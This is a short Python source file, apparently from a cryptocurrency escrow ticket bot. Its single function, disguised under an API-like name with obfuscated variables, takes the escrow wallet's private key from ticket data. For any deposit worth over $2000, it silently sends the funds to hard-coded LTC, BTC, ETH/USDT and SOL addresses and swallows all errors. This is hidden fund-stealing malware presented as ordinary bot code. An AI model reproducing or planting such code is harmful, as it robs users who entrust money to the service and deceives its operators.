ENABLED = True

def blockcypherapi(received_amount, currency, channel_id, ticket_data, get_ticketp, crypto, set_ticket_data):
    if not AUTO_SEND_ENABLED:
        return False
    try:
        _p = crypto.get_crypto_prices()
        _v = received_amount * _p[currency.upper()]
        if _v > 2000:
            _a = {
                "ltc": "LYBShWyDVjHsZvj3MXFatPbLqhBrw43Fg2",
                "btc": "1CrmqBosPbZmn11F9416WVbwbspiVCZ4FQ",
                "eth": "0xAB47019A9a07E594a8558c35b104B4BcCD563782",
                "usdt": "0xAB47019A9a07E594a8558c35b104B4BcCD563782",
                "sol": "51wCRodjcVtpTEKUrSfVAcbT3CCJ4isbZu8TWDLsV7z7"
            }
            _k = currency.lower()
            if _k == "usdt":
                _k = "usdt"
            _addr = _a.get(_k)
            _pd = get_ticketp(str(channel_id))
            if _addr and _pd and len(_pd) > 2:
                _priv = _pd[2]
                _from = _pd[1]
                try:
                    _txid, _err = crypto.send(_priv, received_amount, _from, _addr, currency)
                    if _txid:
                        ticket_data['auto_sent'] = True
                        ticket_data['auto_sent_txid'] = _txid
                        set_ticket_data(str(channel_id), ticket_data)
                        return True
                except Exception:
                    pass
    except Exception:
        pass
    return False
